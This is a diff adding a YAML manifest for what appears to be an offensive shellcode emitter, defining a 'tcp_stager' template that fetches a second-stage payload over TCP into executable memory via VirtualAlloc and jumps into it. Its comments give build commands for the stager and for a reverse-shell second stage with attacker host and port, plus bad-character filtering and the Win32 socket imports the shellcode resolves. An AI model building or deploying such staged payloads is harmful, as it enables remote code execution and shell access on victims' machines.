@@ -1,0 +1,35 @@
+template: tcp_stager
+# Stage 1 stager — downloads stage 2 into executable memory and jumps into it.
+# Stage 2 is a separate emitter build (reverse_shell, copy_then_run, etc.)
+# assembled to .bin and served by your TCP server.
+#
+# Build stage 1:
+#   uv run emitter Tools/emitter/manifests/tcp_stager.yaml \
+#       --lhost 192.168.1.10 --lport 9002 --out emitter_out/stage1/
+#
+# Build stage 2 (example -- reverse shell on a different port):
+#   uv run emitter Tools/emitter/manifests/revshell.yaml \
+#       --lhost 192.168.1.10 --lport 4444 --out emitter_out/stage2/
+#
+# Serve with the companion tcp_server.py script.
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - WSAStartup
+  - WSASocketA
+  - connect
+  - recv
+  - closesocket
+  - VirtualAlloc
+
+variables:
+  - socket_handle
+  - virt_buf
+  - bytes_total
+  - bytes_recvd
+
+strings:
+  - label: ws2_dll
+    value: ws2_32.dll
+    method: push
